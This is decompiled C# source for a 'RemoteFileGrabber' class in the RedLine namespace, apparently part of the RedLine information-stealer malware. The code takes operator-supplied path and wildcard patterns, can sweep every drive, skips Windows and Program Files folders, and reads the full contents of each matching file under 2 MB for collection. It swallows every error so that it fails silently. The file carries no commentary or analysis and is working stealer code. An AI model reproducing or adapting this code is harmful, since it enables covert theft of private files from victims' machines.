using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using RedLine.Models;

namespace RedLine.Logic.Others
{
	// Token: 0x02000050 RID: 80
	public static class RemoteFileGrabber
	{
		// Token: 0x060001EC RID: 492 RVA: 0x00007E78 File Offset: 0x00006078
		public static List<RemoteFile> ParseFiles(IEnumerable<string> patterns, List<string> exceptions)
		{
			List<RemoteFile> list = new List<RemoteFile>();
			try
			{
				exceptions = new List<string>();
				exceptions.Add("\\Windows\\");
				exceptions.Add("\\Program Files\\");
				exceptions.Add("\\Program Files (x86)\\");
				exceptions.Add("\\Program Data\\");
				foreach (string text in patterns)
				{
					try
					{
						string[] array = text.Split(new string[]
						{
							"|"
						}, StringSplitOptions.RemoveEmptyEntries);
						if (array != null && array.Length == 3)
						{
							string text2 = Environment.ExpandEnvironmentVariables(array[0]);
							string[] searchPatterns = array[1].Split(new string[]
							{
								","
							}, StringSplitOptions.RemoveEmptyEntries);
							string a = array[2];
							if (text2 == "%DSK_23%")
							{
								foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
								{
									try
									{
										foreach (string text3 in RemoteFileGrabber.GetDirectoryFiles(driveInfo.RootDirectory.FullName, (a == "1") ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly, exceptions, searchPatterns))
										{
											try
											{
												FileInfo fileInfo = new FileInfo(text3);
												if (fileInfo.Exists && fileInfo.Length <= 2097152L)
												{
													string[] array2 = fileInfo.Directory.FullName.Split(new string[]
													{
														":\\"
													}, StringSplitOptions.RemoveEmptyEntries);
													List<RemoteFile> list2 = list;
													RemoteFile item = new RemoteFile
													{
														FileDirectory = ((array2 != null && array2.Length > 1) ? array2[1] : string.Empty),
														FileName = fileInfo.Name,
														Body = File.ReadAllBytes(text3),
														SourcePath = text3
													};
													list2.Add(item);
												}
											}
											catch
											{
											}
										}
									}
									catch
									{
									}
								}
							}
							else
							{
								foreach (string text4 in RemoteFileGrabber.GetDirectoryFiles(text2, (a == "1") ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly, exceptions, searchPatterns))
								{
									try
									{
										FileInfo fileInfo2 = new FileInfo(text4);
										if (fileInfo2.Exists && fileInfo2.Length <= 2097152L)
										{
											string[] array3 = fileInfo2.Directory.FullName.Split(new string[]
											{
												":\\"
											}, StringSplitOptions.RemoveEmptyEntries);
											List<RemoteFile> list3 = list;
											RemoteFile item = new RemoteFile
											{
												FileDirectory = ((array3 != null && array3.Length > 1) ? array3[1] : string.Empty),
												FileName = fileInfo2.Name,
												Body = File.ReadAllBytes(text4),
												SourcePath = text4
											};
											list3.Add(item);
										}
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060001ED RID: 493 RVA: 0x00008220 File Offset: 0x00006420
		public static IEnumerable<string> GetDirectoryFiles(string rootPath, SearchOption searchOption, IEnumerable<string> exceptions, string[] searchPatterns)
		{
			IEnumerable<string> enumerable = Enumerable.Empty<string>();
			if (searchOption == SearchOption.AllDirectories)
			{
				try
				{
					foreach (string text in Directory.EnumerateDirectories(rootPath))
					{
						if (exceptions != null && exceptions.Any<string>())
						{
							bool flag = false;
							foreach (string value in exceptions)
							{
								if (text.Contains(value))
								{
									flag = true;
									break;
								}
							}
							if (flag)
							{
								continue;
							}
						}
						enumerable = enumerable.Concat(RemoteFileGrabber.GetDirectoryFiles(text, searchOption, exceptions, searchPatterns));
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (PathTooLongException)
				{
				}
			}
			foreach (string searchPattern in searchPatterns)
			{
				try
				{
					enumerable = enumerable.Concat(Directory.EnumerateFiles(rootPath, searchPattern));
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			return enumerable;
		}
	}
}
